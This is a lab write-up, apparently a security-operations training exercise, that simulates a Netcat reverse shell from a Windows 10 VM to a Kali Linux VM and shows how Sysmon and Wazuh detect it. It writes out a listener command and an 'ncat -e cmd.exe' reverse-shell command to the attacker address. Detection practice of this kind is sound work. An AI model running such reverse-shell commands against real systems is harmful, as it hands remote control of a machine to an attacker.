# LAB 04 - Reverse Shell Detection

## Objective

The objective of this lab was to simulate a reverse shell attack using Netcat (Ncat) from a Windows 10 endpoint to a Kali Linux attacker machine and investigate the generated endpoint telemetry using Sysmon and Wazuh SIEM.

---

## Lab Environment

| Component | Details |
|-----------|---------|
| SIEM | Wazuh 4.14.7 |
| Attacker | Kali Linux |
| Victim | Windows 10 |
| Endpoint Monitoring | Wazuh Agent |
| Endpoint Telemetry | Sysmon |
| Tool Used | Netcat (Ncat) |
| Virtualization | Oracle VirtualBox |
| Network | NAT Network |

---

## Attack Scenario

An attacker establishes a reverse shell from the Windows endpoint to the Kali Linux machine using Netcat. Once the connection is established, the attacker gains remote command-line access to the Windows system and executes system commands.

---

## Lab Topology

```
Kali Linux (Attacker)
IP Address: 10.0.2.4

        ▲
        │ Reverse Shell
        │

Windows 10 (Victim)
IP Address: 10.0.2.5

        │

Sysmon

        │

Wazuh Agent

        │

Wazuh Manager

        │

Wazuh Dashboard
```

---

## Verification Steps

### Step 1 – Verify Kali Linux IP

Command

```bash
ip a
```

Screenshot

```
LAB04-01-Kali-IP.png
```

---

### Step 2 – Verify Windows IP

Command

```cmd
ipconfig
```

Screenshot

```
LAB04-02-Windows-IP.png
```

---

### Step 3 – Verify Netcat Installation

Command

```cmd
where ncat
```

Purpose

Verify that Ncat is installed on the Windows endpoint.

Screenshot

```
LAB04-03-Netcat-Installed.png
```

---

## Attack Execution

### Step 4 – Start Netcat Listener

Command

```bash
nc -lvnp 4444
```

Purpose

Start a listener on Kali Linux waiting for an incoming reverse shell connection.

Screenshot

```
LAB04-04-Netcat-Listener.png
```

---

### Step 5 – Execute Reverse Shell

Command

```cmd
ncat.exe 10.0.2.4 4444 -e cmd.exe
```

Purpose

Establish a reverse shell from Windows to the Kali Linux attacker machine.

Screenshot

```
LAB04-05-ReverseShell-Command.png
```

---

### Step 6 – Verify Reverse Shell

Commands Executed

```cmd
whoami
hostname
ipconfig
```

Purpose

Verify that the attacker obtained an interactive command prompt on the Windows endpoint.

Screenshot

```
LAB04-06-ReverseShell-Connected.png
```

---

## Detection

The reverse shell generated Sysmon Process Creation (Event ID 1) telemetry. Wazuh successfully collected the endpoint logs and generated alerts related to abnormal command prompt execution.

Screenshot

```
LAB04-07-Wazuh-Threat-Hunting.png
```

---

## Wazuh Analysis

Observed Activity

- Reverse shell established successfully.
- Sysmon Event ID 1 (Process Creation) recorded.
- Wazuh Rule ID **92052** triggered.
- Abnormal command prompt execution detected.
- Endpoint telemetry successfully collected.

Rule Details Screenshot

```
LAB04-08-Alert-Rule.png
```

Alert Investigation Screenshot

```
LAB04-09-Alert-Details.png
```

---

## MITRE ATT&CK Mapping

| Technique | ID |
|-----------|----|
| Ingress Tool Transfer | T1105 |
| Windows Command Shell | T1059.003 |

---

## Outcome

**Successful**

The reverse shell activity successfully generated Sysmon process creation events, which were forwarded to Wazuh for centralized monitoring and investigation. The activity demonstrated how endpoint telemetry can be used to identify suspicious remote command execution during SOC operations.

---

## Skills Demonstrated

- Reverse Shell Simulation
- Netcat (Ncat)
- Sysmon Process Monitoring
- Wazuh Threat Hunting
- Alert Investigation
- Endpoint Detection
- MITRE ATT&CK Mapping
- SOC Incident Analysis
